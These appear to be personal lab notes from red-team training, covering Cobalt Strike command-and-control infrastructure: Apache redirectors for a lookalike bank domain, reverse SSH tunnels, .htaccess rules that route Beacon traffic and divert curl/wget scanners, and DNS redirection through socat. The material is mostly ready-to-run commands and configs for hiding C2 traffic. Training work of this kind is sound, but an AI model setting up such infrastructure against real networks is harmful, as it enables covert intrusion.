
***NOTE** Copy and paste from desktop to snaplabs ctrl-shift-alt*
## Apache setup on redirector

On redirector-1:

```
sudo apt install apache2
sudo a2enmod ssl rewrite proxy proxy_http
cd /etc/apache2/sites-enabled
sudo rm 000-default.conf
cd
sudo ln -s ../sites-available/default-ssl.conf
ll
sudo systemctl restart apache2
```

### On PowerDNS

Now go to PowerDNS box in snaplabs applications, sign in with admin:admin

Hosted Domains are listed, in our case it's infinity-bank.com, has an A record that points to the redirector for us. Probably need to setup on our own for exam, keep an eye on.
### On attacker desktop

Can confirm correctly configured from attacker desktop with: 
```
dig infinity-bank.com +short
dig www.infinity-bank.com +short
```

Generate SSL Certs for it:

```
//open powershell
wsl
cd
openssl genrsa -out infinity-bank.key 2048
openssl req -new -key infinity-bank.key -out infinity-bank.csr
```

The public/private keypair for this fake CA is located in `/home/attacker/ca`.

Before processing the CSR, create a new file, `infinity-bank.ext` with the following content in the `/home/attacker/ca` folder
```
authorityKeyIdentifier=keyid,issuer
basicConstraints=CA:FALSE
keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment
subjectAltName = @alt_names

[alt_names]
DNS.1 = infinity-bank.com
DNS.2 = www.infinity-bank.com
```

Now generate a signed certificate:
```
openssl x509 -req -in infinity-bank.csr -CA ca/ca.crt -CAkey ca/ca.key -CAcreateserial -out infinity-bank.crt -days 365 -sha256 -extfile ca/infinity-bank.ext
```

Now move over to the redirector:

```
scp infinity-bank.key attacker@10.10.0.100:/home/attacker/private.key
scp infinity-bank.crt attacker@10.10.0.100:/home/attacker/public.crt
```

Confirm files have been placed correctly in `/home/attacker/`

```
ssh attacker@10.10.0.100
ls -l
```

Now in that same ssh session copy the private key and public cert into their respective places:
```
sudo cp private.key /etc/ssl/private/
sudo cp public.crt /etc/ssl/certs/
```

Open `/etc/apache2/sites-enabled/default-ssl.conf` in a text editor (nano or vim) and look for lines 32-33. Change paths to the ones we created for the key and cert file

```
sudo vim `/etc/apache2/sites-enabled/default-ssl.conf`
//make changes
sudo systemctl restart apache2
```

Confirm by visiting https://www.infinity-bank.com on the attacker desktop and view the certificate

## Beacon certificates

### On attacker desktop

```
//open powershell
wsl
cd
openssl req -x509 -nodes -newkey rsa:2048 -keyout localhost.key -out localhost.crt -sha256 -days 365 -subj '/CN=localhost'
openssl pkcs12 -inkey localhost.key -in localhost.crt -export -out localhost.pfx
	pass123
keytool -importkeystore -srckeystore localhost.pfx -srcstoretype pkcs12 -destkeystore localhost.store
```

This will produce a new file, `localhost.store`, which needs to be copied this to the team server.

```
rm localhost.pfx
scp localhost.store attacker@10.10.5.50:/home/attacker/cobaltstrike/
```

### SSH to attacker server
Make new keystore file in the webbug.profile:
```
ssh attacker@10.10.5.50
vim /home/attacker/cobaltstrike/c2-profiles/normal/webbug.profile
```

Add this to the top of the file:
```
https-certificate {
     set keystore "localhost.store";
     set password "pass123";
}
```

Launch teamserver with the updated profile:

```
cd cobaltstrike/
sudo ./teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile
```

Start up Cobalt Strike on the attacker desktop. Connect with the above password. Now create a new HTTPS listener with the HTTPS hosts set as www.infinity-bank.com
![[Pasted image 20250318101223.png]]

## SSH Tunnel

Create a reverse SSH tunnel from the team server to Redirector 1

### From attacker Desktop

```
//open powershell
wsl
cd
ssh attacker@10.10.5.50
tmux new
ssh -N -R 8443:localhost:443 attacker@10.10.0.100
```

You can now `curl localhost:8443` on redirector-1 and it will hit the Cobalt Strike listener.  However, it will throw an error that the SSL certificate is untrusted. Now fix this:
```
//open powershell
wsl
cd
scp localhost.crt attacker@10.10.0.100:/home/attacker/
//ssh to redirector-1
ssh attacker@10.10.0.100
sudo cp localhost.crt /usr/local/share/ca-certificates/
sudo update-ca-certificates
```

### With autossh from the teamserver

On the team server create a new file at `.ssh/config` and add the following content:

```
Host                 redirector-1
HostName             10.10.0.100
User                 attacker
Port                 22
IdentityFile         /home/attacker/.ssh/id_rsa
RemoteForward        8443 localhost:443
ServerAliveInterval  30
ServerAliveCountMax  3
```

Then run the tunnel:
```
autossh -M 0 -f -N redirector-1
```


**NOTE** When checking on redirector-1 for ssh being configured right look for localhost binded to 8443 in this commands output: `sudo ss -lntp`
## Enabling Apache Redirection

### On redirector-1

1. Change the .htaccess config file information in the `/etc/apache2/sites-enabled/default-ssl.conf` file. Under `</VirtualHost>` add a `<Directory>` value with this content:

```
<Directory /var/www/html/>
    Options Indexes FollowSymLinks MultiViews
    AllowOverride All
    Require all granted
</Directory>
```

2. Before closing file, add `SSLProxyEngine on` underneath `SSLEngine on` and then restart apache.

3. Next, create a new `.htaccess` file in the apache web root, `/var/www/html` and enter the following:
```
RewriteEngine on
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P]
```

Can confirm from Cobalt Strikes web log that the a request against https://www.infinity-bank.com/test goes through with the redirect.

## User Agent, Cookie, URI and Query Rules

### On redirector-1
1. run `echo "Nothing to see here..." | sudo tee /var/www/html/diversion`
2. Edit the .htaccess file with this:
```
RewriteEngine on

RewriteCond %{HTTP_USER_AGENT} curl|wget [NC]
RewriteRule ^a$ diversion [PT]

RewriteCond /var/www/html/%{REQUEST_URI} -f
RewriteRule ^.*$ %{REQUEST_FILENAME} [L]

RewriteCond %{HTTP_COOKIE} SESSIONID
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P]

RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P]
```

### Cookie Rules continued

### On team server
Change the webbug profiles http gets metadata section on the team server with:

```
metadata {
    netbios;
    prepend "SESSIONID=";
    header "Cookie";
}
```

make sure to restart the team server to apply

### URI and Query Rules

### 


Allowing traffic to files if the exact name is used for the .htaccess:

```
RewriteCond %{HTTP_USER_AGENT} curl|wget [NC]
RewriteRule ^a|b|c|d$ diversion [PT]

RewriteCond /var/www/html/%{REQUEST_URI} -f
RewriteRule ^.*$ %{REQUEST_FILENAME} [L]

RewriteCond %{REQUEST_METHOD} GET [NC]
RewriteCond %{REQUEST_URI} a|b|c|d
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P,L]
```

Full .htaccess file that is currently working:

```
RewriteEngine on

RewriteCond %{HTTP_USER_AGENT} curl|wget [NC]
RewriteRule ^a$ diversion [PT]

RewriteCond /var/www/html/%{REQUEST_URI} -f
RewriteRule ^.*$ %{REQUEST_FILENAME} [L]

RewriteCond %{HTTP_COOKIE} SESSIONID
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P]

RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P]

RewriteCond %{REQUEST_METHOD} GET [NC]
RewriteCond %{HTTP_COOKIE} SESSIONID
RewriteCond %{REQUEST_URI} __utm.gif
RewriteCond %{QUERY_STRING} utmac=UA-2202604-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P,L]

RewriteCond %{REQUEST_METHOD} POST [NC]
RewriteCond %{REQUEST_URI} ___utm.gif
RewriteCond %{QUERY_STRING} utmac=UA-220(.*)-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P,L]

RewriteCond %{HTTP_USER_AGENT} curl|wget [NC]
RewriteRule ^a|b|c|d$ diversion [PT]

RewriteCond /var/www/html/%{REQUEST_URI} -f
RewriteRule ^.*$ %{REQUEST_FILENAME} [L]

RewriteCond %{REQUEST_METHOD} GET [NC]
RewriteCond %{REQUEST_URI} a|b|c|d
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P,L]
```

## Turning off Beacon staging

### On team server just add this to the webbug.profile

```
set host_stage "false";
```

make sure to restart teamserver

## Redirecting DNS

We can also redirect DNS traffic through a redirector, for which we'll use **Redirector 2**.

### Sign into PowerDNS on snaplabs

it already exists but it's the bacs cert with ns1.infinity-bank.com. as a NS record

### On teamserver

Have to open a tcp tunnel from teamserver to the redirector-2

```
ssh attacker@10.10.0.200 -R 5353:localhost:5353
//then on redirector 2 with this ssh run:
sudo socat udp4-listen:53,reuseaddr,fork tcp:localhost:5353
//now go back to teamserver, im doing this in tmux sessions to separate
sudo socat tcp-listen:5353,reuseaddr,fork udp4-sendto:localhost:53
```

Now create a DNS listener with DNS like so:

![[Pasted image 20250403222442.png]]

## Visual studio setup

Go to _Project > Add Reference > Browse_ and add a reference to `DInvoke.Data.dll` and `DInvoke.DynamicInvoke.dll` in `C:\Tools\DInvoke\DInvoke.DynamicInvoke\bin\Release\netstandard2.0`.

Change the DllImport attribute to `UnmanagedFunctionPointer` and the extern keyword to `delegate`

